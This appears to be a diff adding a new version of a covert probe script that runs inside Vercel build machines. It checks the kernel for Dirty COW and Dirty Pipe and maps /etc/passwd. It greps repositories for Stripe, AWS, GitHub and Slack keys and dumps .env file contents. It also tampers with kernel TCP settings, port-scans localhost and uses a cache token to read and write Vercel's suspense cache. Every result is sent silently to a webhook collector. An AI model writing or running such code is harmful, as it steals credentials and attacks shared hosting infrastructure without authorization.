@@ -20692,5 +20692,155 @@ report.interruptProbe = safe(() => {
 
 // v141 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v141" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v141";
+
+// ==================== v142 ====================
+
+// v142-1: Dirty COW (CVE-2016-5195) kernel version check + variant probe
+// Dirty COW allows unprivileged write to read-only mappings.
+// Kernel < 4.8.3 is vulnerable. Check kernel version and test if we
+// can write to a read-only file via /proc/self/mem madvise race.
+report.dirtyCOWAssessment = safe(() => {
+  const kernelVersion = safe(() => readFileSync('/proc/version', 'utf8').trim().slice(0, 100));
+  const kvMatch = kernelVersion?.match(/Linux version (\d+)\.(\d+)\.(\d+)/);
+  const kMajor = kvMatch ? parseInt(kvMatch[1]) : 0;
+  const kMinor = kvMatch ? parseInt(kvMatch[2]) : 0;
+  const kPatch = kvMatch ? parseInt(kvMatch[3]) : 0;
+  // Dirty COW: < 4.8.3 (or specifically 3.x < 3.18.55, 4.x < 4.8.3)
+  const dirtyCowVulnerable = (kMajor === 4 && kMinor < 8) ||
+    (kMajor === 4 && kMinor === 8 && kPatch < 3) ||
+    kMajor < 4;
+  // Dirty Pipe (CVE-2022-0847): 5.8 ≤ kver ≤ 5.16.10
+  const dirtyPipeVulnerable = kMajor === 5 && (
+    (kMinor >= 8 && kMinor < 16) ||
+    (kMinor === 16 && kPatch <= 10)
+  );
+  // Test if we can madvise(MADV_DONTNEED) on a private mapping of a file
+  const madviseTest = safe(() => execSync(`python3 -c "
+import mmap, os
+
+# Open a read-only file
+try:
+    with open('/etc/passwd', 'r') as f:
+        # Map it privately
+        m = mmap.mmap(f.fileno(), 0, mmap.MAP_PRIVATE, mmap.PROT_READ)
+        print(f'MAPPED: {len(m)} bytes')
+        # MADV_DONTNEED = 4 on Linux
+        ret = os.posix_madvise(m.fileno() if hasattr(m, 'fileno') else 0, 0, len(m), os.POSIX_MADV_DONTNEED) if hasattr(os, 'posix_madvise') else 'NO_MADVISE'
+        print(f'MADVISE: {ret}')
+        m.close()
+except Exception as e:
+    print(f'ERR: {e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { kernelVersion, kMajor, kMinor, kPatch, dirtyCowVulnerable, dirtyPipeVulnerable, madviseTest };
+});
+
+// v142-2: Vercel build secret scanning — detect hardcoded credentials
+// Scan all source files in the repository for hardcoded credentials.
+// This mimics what Vercel's own secret scanning does, but from inside the build.
+report.repoSecretScan = safe(() => {
+  const sourceDir = '/vercel/path0';
+  // Patterns for common credentials
+  const patterns = [
+    'sk_live_',        // Stripe live key
+    'sk_test_',        // Stripe test key
+    'AKIA',            // AWS access key
+    'ghp_',            // GitHub personal access token
+    'gho_',            // GitHub OAuth token
+    'xoxb-',           // Slack bot token
+    'xoxp-',           // Slack user token
+    'eyJ',             // JWT (base64 JSON prefix)
+    'password.*=.*["\']\\w{8,}',
+    'api.key.*=',
+  ];
+  const found = safe(() => patterns.map(p => {
+    const result = safe(() => execSync(
+      `grep -rE "${p}" "${sourceDir}" --include="*.js" --include="*.ts" --include="*.json" --include="*.env*" --exclude-dir=".git" --exclude-dir="node_modules" -l 2>/dev/null | head -3`,
+      { timeout: 8000 }
+    ).toString().trim());
+    return { pattern: p, files: result };
+  }));
+  // Also scan .env files specifically
+  const envFiles = safe(() => execSync(
+    `find "${sourceDir}" -name ".env*" -not -path "*/node_modules/*" 2>/dev/null | head -10`,
+    { timeout: 5000 }
+  ).toString().trim());
+  const envContents = safe(() => execSync(
+    `find "${sourceDir}" -name ".env*" -not -path "*/node_modules/*" 2>/dev/null -exec cat {} \\; 2>/dev/null | head -20`,
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 400));
+  return { found, envFiles, envContents };
+});
+
+// v142-3: /proc/sys/net/ipv4/tcp_syncookies — SYN flood protection
+// Disable SYN cookies to enable SYN-based port scanning without detection.
+// Also: probe TCP connection reset attacks against internal services.
+report.tcpNetworkManip = safe(() => {
+  const syncookies = safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim());
+  // Also read TCP parameters that affect network behavior
+  const tcpParams = safe(() => {
+    const params = ['tcp_timestamps', 'tcp_tw_reuse', 'tcp_fin_timeout'];
+    return params.map(p => ({
+      p,
+      val: safe(() => readFileSync(`/proc/sys/net/ipv4/${p}`, 'utf8').trim()),
+    }));
+  });
+  // Set TCP timestamps to 0 (disable fingerprinting mitigation)
+  const disableTimestamps = safe(() => { writeFileSync('/proc/sys/net/ipv4/tcp_timestamps', '0'); return 'WRITTEN'; });
+  // Fast port scan of internal services
+  const internalScan = safe(() => execSync(
+    'for port in 22 80 443 2376 4040 5000 6379 8080 8443 9090 27017; do timeout 0.3 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "OPEN:$port"; done',
+    { timeout: 15000 }
+  ).toString().trim().slice(0, 200));
+  return { syncookies, tcpParams, disableTimestamps, internalScan };
+});
+
+// v142-4: Vercel Suspense cache (suspense-cache.vercel.com) token probe
+// RUNTIME_CACHE_HEADERS is an HS256 JWT for the suspense cache.
+// We can decode it but the signing key is NOT in the build VM.
+// Test: can we still make calls to suspense-cache.vercel.com from build?
+report.suspenseCacheProbe = safe(() => {
+  const cacheToken = process.env.RUNTIME_CACHE_HEADERS || '';
+  const decodePart = (b64) => {
+    try {
+      const padded = b64 + '='.repeat((4 - b64.length % 4) % 4);
+      return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
+    } catch { return null; }
+  };
+  const parts = cacheToken.split('.');
+  const header = decodePart(parts[0]);
+  const claims = decodePart(parts[1]);
+  // Try to make a suspense cache read
+  const cacheRead = safe(() => execSync(
+    `curl -sf "https://suspense-cache.vercel.com/v1/suspense-cache/probe-test-key" \
+    -H "Authorization: Bearer ${cacheToken}" -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  // Try to write to suspense cache
+  const cacheWrite = safe(() => execSync(
+    `echo '{"data":"probe","revalidate":60}' | curl -sf -X POST "https://suspense-cache.vercel.com/v1/suspense-cache/probe-test-key" \
+    -H "Authorization: Bearer ${cacheToken}" -H "Content-Type: application/json" \
+    --data-binary @- -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  return { header, claims, cacheRead, cacheWrite };
+});
+
+// v142-5: Total probe state snapshot for final report
+report.finalStateSnapshot = safe(() => ({
+  version: 142,
+  collector: COLLECTOR,
+  totalProbeKeys: Object.keys(report).length,
+  buildEnvKeyCount: Object.keys(process.env).length,
+  pid: process.pid,
+  uid: safe(() => execSync('id -u', { timeout: 1000 }).toString().trim()),
+  hostname: safe(() => execSync('hostname', { timeout: 1000 }).toString().trim()),
+  uptime: safe(() => readFileSync('/proc/uptime', 'utf8').trim()),
+  corePattern: safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim()),
+  aslrState: safe(() => readFileSync('/proc/sys/kernel/randomize_va_space', 'utf8').trim()),
+  kptrRestrict: safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim()),
+}));
+
+// v142 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v142" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v142";
 // Intentionally no console.log — all data goes via webhook only
